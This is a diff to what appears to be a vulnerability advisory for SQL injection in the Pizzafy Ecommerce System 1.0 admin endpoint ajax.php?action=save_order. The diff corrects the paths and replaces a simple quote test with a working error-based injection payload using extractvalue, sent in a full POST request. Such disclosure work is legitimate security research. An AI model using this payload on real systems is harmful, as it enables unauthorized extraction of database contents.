@@ -8,10 +8,10 @@
 - **Status:** Unpatched  
 
 ## **Vulnerable Endpoint:**  
-- `/pizza/admin/ajax.php?action=save_order`
+- `/pizzafy/admin/ajax.php?action=save_order`
 
 ## **Overview**
-The Pizzafy Ecommerce System 1.0 contains multiple critical SQL Injection vulnerabilities that allow an attacker to extract sensitive data, bypass authentication, and get records from the database.
+The Pizzafy Ecommerce System 1.0 contains critical SQL Injection vulnerabilities that allow an attacker to extract sensitive data, bypass authentication, and get records from the database.
 
 ## **Vulnerability Description:**  
 # Error-Based SQL Injection Vulnerability in SELECT Operation
@@ -74,7 +74,7 @@ public function save_order() {
 Below is a **POST** request demonstrating the vulnerability using a **Error-Based SQL injection payload**:  
 
 ```
-POST /pizza/admin/ajax.php?action=save_order HTTP/1.1
+POST /pizzafy/admin/ajax.php?action=save_order HTTP/1.1
 Host: localhost
 Content-Length: 83
 sec-ch-ua: 
@@ -88,20 +88,20 @@ Origin: http://localhost
 Sec-Fetch-Site: same-origin
 Sec-Fetch-Mode: cors
 Sec-Fetch-Dest: empty
-Referer: http://localhost/pizza/checkout.php
+Referer: http://localhost/pizzafy/checkout.php
 Accept-Encoding: gzip, deflate
 Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
 Cookie: PHPSESSID=fvkkm43h4pnc6r6khno620js83
 Connection: close
 
-first_name=test&last_name=test&email=test%40gmail.com'&mobile=156156&address=15615&id=1'
+first_name=test&last_name=test&email=test%40gmail.com'&mobile=156156&address=15615&id=-8 OR extractvalue(1,concat(0x7e,database())) --
 ```
 
 ### **Explanation:**  
 This payload injects the SQL command:  
 
 ```sql
-...&id=1'...
+id=-8 OR extractvalue(1,concat(0x7e,database())) --
 ```
 This makes it possible to get data from the database.
 
@@ -109,7 +109,7 @@ This makes it possible to get data from the database.
 
 ## Image
 
-- ![](https://i.imgur.com/cDxaSAf.png)
+- ![](https://i.imgur.com/1pA3PYV.png)
 ---
 
 ## Remediation
